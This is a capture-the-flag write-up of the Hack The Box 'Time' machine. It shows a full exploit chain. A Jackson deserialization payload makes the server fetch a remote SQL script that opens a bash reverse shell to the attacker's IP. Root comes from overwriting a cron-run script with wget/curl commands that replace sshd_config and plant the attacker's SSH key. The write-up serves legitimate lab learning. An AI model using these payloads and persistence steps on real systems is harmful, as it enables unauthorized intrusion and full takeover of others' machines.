layout: page
title: "Time - Hack The Box"
permalink: /boxes/time

# Time

- [Time](#time)
  - [Discovery](#discovery)
  - [get user shell](#get-user-shell)
  - [Get a root shell](#get-a-root-shell)
    - [Direct ssh](#direct-ssh)
  - [Success](#success)

IP: 10.10.10.214

`echo 'time.htb 10.10.10.214' >> /etc/hosts`


## Discovery

`nmap -A time.htb`

Found current SSH on 22 and apache on 80.

In web browser found text entry box. placing invalid json in the box displays information about the library used to create the form:  jackson

This form will run java found in the well formatted json, we can use this 
to establish a reverse shell

## get user shell

my ip when connected was 10.10.16.22

> pipe listens on port 4444

`nc -lvp 4444`

> create our sql function to intiate the reverse shell, use our own ip and the port of our netcat listener

```sql
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
        String[] command = {"bash", "-c", cmd};
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('bash --norc -i >& /dev/tcp/10.10.16.22/4444 0>&1')
```

> serve this file (and others later)

`python3 -m http.server 8000`

> in validate form, use the exploit to download and run the script

`["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.16.22:8000/inject.sql'"}]`

>> this became tedious so let's just send with curl

`curl 'http://time.htb/' --data-raw 'mode=2&data=%5B%22ch.qos.logback.core.db.DriverManagerConnectionSource%22%2C+%7B%22url%22%3A%22jdbc%3Ah2%3Amem%3A%3BTRACE_LEVEL_SYSTEM_OUT%3D3%3BINIT%3DRUNSCRIPT+FROM+%27http%3A%2F%2F10.10.16.22%3A8000%2Finject.sql%27%22%7D%5D'`

**we have access!**

## Get a root shell

Let's upgrade our shell - not necessary
<!-- TODO use stty raw -->
`python3 -c 'import pty;pty.spawn("/bin/bash")'`

Messed around with `linenum.sh` but for this time box, let's look for cron job... 

or just listen for one:

download and server [pspy](https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy32s) with our webserver

```bash
cd /tmp # we can't write to /var/www
wget 10.10.16.22:8000/pspy32s
chmod +x pspy32s
./pspy32s
```

>2021/03/05 15:19:01 CMD: UID=0    PID=28297  | /bin/bash /usr/bin/timer_backup.sh 

This is running often AS root

### Direct ssh

Not sure how ssh is configured, we can just make our own config

On our machine

```bash
cat <<EOF > ./sshd_config
PubkeyAuthentication yes
PermitRootLogin yes
PasswordAuthentication no
MaxAuthTries 9999
EOF
```

serve up my pubkey as well

`cp ~/.ssh/id_rsa.pub .`

Back on the victim

```bash
cat << EOF > /usr/bin/timer_backup.sh
#!/bin/bash
# Can create a short lived reverse tunnel as root here as well
# bash --norc -i >& /dev/tcp/10.10.16.22/4445 0>&1
wget 10.10.16.22:8000/sshd_config
if ! diff sshd_config /etc/ssh/sshd_config; then
  cat sshd_config >/etc/ssh/sshd_config
  systemctl restart sshd
fi
# Ensure our ssh permissions
mkdir -p ~/.ssh
curl 10.10.16.22:8000/id_rsa.pub > ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
EOF
```

## Success

`ssh root@time.htb`

> root@time:~# 